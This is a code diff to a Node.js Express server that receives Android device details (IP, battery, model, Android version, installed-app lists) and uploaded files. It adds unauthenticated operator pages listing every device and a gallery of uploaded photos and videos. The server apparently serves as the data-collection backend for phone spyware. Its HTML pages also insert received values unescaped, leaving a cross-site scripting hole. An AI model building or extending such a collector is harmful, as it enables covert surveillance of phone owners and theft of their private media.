@@ -6,7 +6,7 @@ const app = express();
 
 /* ================= CONFIG ================= */
 
-const LOG_FILE = "logs.txt";
+const LOG_FILE = "logs.json";
 const UPLOAD_DIR = path.join(__dirname, "uploads");
 
 if (!fs.existsSync(UPLOAD_DIR)) {
@@ -24,9 +24,23 @@ function getIP(req) {
 function saveLog(data) {
   try {
     fs.appendFileSync(LOG_FILE, JSON.stringify(data) + "\n");
-  } catch (e) {
-    console.log("Log error:", e.message);
+  } catch {}
+}
+
+function parseBody(body) {
+  const obj = {};
+  body.split("&").forEach(pair => {
+    const [key, value] = pair.split("=");
+    if (key && value) {
+      obj[key] = decodeURIComponent(value);
+    }
+  });
+
+  if (obj.apps) {
+    obj.apps = obj.apps.split(",").map(x => x.trim()).filter(Boolean);
   }
+
+  return obj;
 }
 
 /* ================= TRACK ================= */
@@ -35,20 +49,26 @@ app.post('/track', (req, res) => {
 
   let body = "";
 
-  req.on('data', chunk => {
-    body += chunk.toString();
-  });
+  req.on('data', chunk => body += chunk.toString());
 
   req.on('end', () => {
 
+    const parsed = parseBody(body);
+
     const data = {
       ip: getIP(req),
-      raw: body,
+      battery: parsed.battery,
+      model: parsed.model,
+      brand: parsed.brand,
+      android: parsed.android,
+      apps: parsed.apps || [],
       time: new Date().toISOString()
     };
 
-    console.log("\n📡 TRACK =====================");
-    console.log(data);
+    console.log("\n📱 DEVICE =====================");
+    console.log("IP:", data.ip);
+    console.log("Battery:", data.battery);
+    console.log("Apps count:", data.apps.length);
 
     saveLog(data);
 
@@ -67,11 +87,6 @@ app.post('/upload', (req, res) => {
   req.pipe(stream);
 
   req.on('end', () => {
-
-    console.log("\n📦 FILE RECEIVED =====================");
-    console.log("File:", fileName);
-    console.log("IP:", getIP(req));
-
     saveLog({
       type: "file",
       file: fileName,
@@ -80,28 +95,101 @@ app.post('/upload', (req, res) => {
 
     res.json({ status: "uploaded" });
   });
+});
 
-  req.on('error', () => {
-    res.status(500).send("error");
+/* ================= USERS (ADVANCED VIEW) ================= */
+
+app.get('/users', (req, res) => {
+
+  if (!fs.existsSync(LOG_FILE)) return res.send("No data");
+
+  const logs = fs.readFileSync(LOG_FILE, "utf-8")
+    .split("\n")
+    .filter(Boolean)
+    .map(x => JSON.parse(x));
+
+  let html = `
+  <html>
+  <head>
+    <style>
+      body { background:#111; color:#fff; font-family:sans-serif; }
+      .card { border:1px solid #333; padding:15px; margin:10px; border-radius:10px; }
+      .apps { max-height:200px; overflow:auto; background:#000; padding:10px; }
+      .apps div { font-size:12px; border-bottom:1px solid #222; padding:2px; }
+    </style>
+  </head>
+  <body>
+    <h2>Total Devices: ${logs.length}</h2>
+  `;
+
+  logs.reverse().forEach(user => {
+
+    html += `
+    <div class="card">
+      <b>IP:</b> ${user.ip}<br>
+      <b>Device:</b> ${user.brand} ${user.model}<br>
+      <b>Android:</b> ${user.android}<br>
+      <b>Battery:</b> ${user.battery}<br>
+      <b>Time:</b> ${user.time}<br>
+
+      <h4>Apps (${user.apps?.length || 0})</h4>
+      <div class="apps">
+        ${(user.apps || []).map(app => `<div>${app}</div>`).join("")}
+      </div>
+    </div>
+    `;
   });
+
+  html += "</body></html>";
+
+  res.send(html);
 });
 
-/* ================= HEALTH ================= */
+/* ================= GALLERY ================= */
 
-app.get('/health', (req, res) => {
-  res.json({ status: "running" });
+app.get('/gallery', (req, res) => {
+
+  const files = fs.readdirSync(UPLOAD_DIR);
+
+  let html = `
+  <html>
+  <head>
+    <style>
+      body { background:#111; color:#fff; font-family:sans-serif; }
+      .grid { display:flex; flex-wrap:wrap; }
+      img, video { width:200px; margin:10px; border-radius:10px; }
+    </style>
+  </head>
+  <body>
+    <h2>Total Files: ${files.length}</h2>
+    <div class="grid">
+  `;
+
+  files.reverse().forEach(file => {
+
+    if (file.endsWith(".jpg") || file.endsWith(".png")) {
+      html += `<img src="/uploads/${file}" />`;
+    } else if (file.endsWith(".mp4")) {
+      html += `<video controls src="/uploads/${file}"></video>`;
+    } else {
+      html += `<a href="/uploads/${file}">${file}</a>`;
+    }
+
+  });
+
+  html += `</div></body></html>`;
+
+  res.send(html);
 });
 
-/* ================= HOME ================= */
+/* ================= STATIC ================= */
 
-app.get('/', (req, res) => {
-  res.send("Server running");
-});
+app.use('/uploads', express.static(UPLOAD_DIR));
 
 /* ================= START ================= */
 
 const PORT = process.env.PORT || 3000;
 
 app.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
+  console.log("Server running on port", PORT);
 });
